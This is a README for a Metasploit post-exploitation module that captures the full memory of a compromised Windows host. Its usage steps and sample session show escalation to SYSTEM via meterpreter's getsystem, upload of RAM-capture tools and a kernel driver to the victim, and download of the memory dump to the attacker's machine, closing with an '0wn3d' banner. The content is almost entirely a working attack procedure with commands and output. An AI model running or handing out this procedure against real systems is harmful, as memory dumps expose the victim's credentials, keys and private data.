# Metasploit Modules

## Utilization

After you got an meterpreter session run the command bellow If the script requires SYSTEM
```
meterpreter > getsystem
```

After that run the script, for example
```
meterpreter > run post/windows/gather/forensics/memorydump RAMCAPTURE_PATH="/tmp/Ram_Capturer/"
```

## Samples
```
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > background 
[*] Backgrounding session 1...
msf exploit(multi/handler) > use post/windows/gather/forensics/memorydump
msf post(windows/gather/forensics/memorydump) > set RAMCAPTURE_PATH /tmp/Ram_Capturer/
RAMCAPTURE_PATH => /tmp/Ram_Capturer/
msf post(windows/gather/forensics/memorydump) > set session 1
session => 1
msf post(windows/gather/forensics/memorydump) > show options 

Module options (post/windows/gather/forensics/memorydump):

   Name             Current Setting     Required  Description
   ----             ---------------     --------  -----------
   RAMCAPTURE_PATH  /tmp/Ram_Capturer/  yes       Path of Belkasoft RAM Capturer
   SESSION          1                   yes       The session to run this module on.


msf post(windows/gather/forensics/memorydump) > run

[*] Executing Dump of x64 architherure host
[!] Sending file, this may take some time...
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\msvcp110.dll
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\msvcr110.dll
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\RamCapture64.exe
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\ramcapturedriver.cat
[*] Uploading file C:\Users\helvio\AppData\Local\Temp\RamCaptureDriver64.sys
[*] Running RamCapture64.exe
[!] This may take some time...
[*] Downloading memory dump to /tmp/niYsAkm.vmem
[*] Downloading completed!
[+] 0wn3d by M4v3r1cK!
[*] Post module execution completed
```

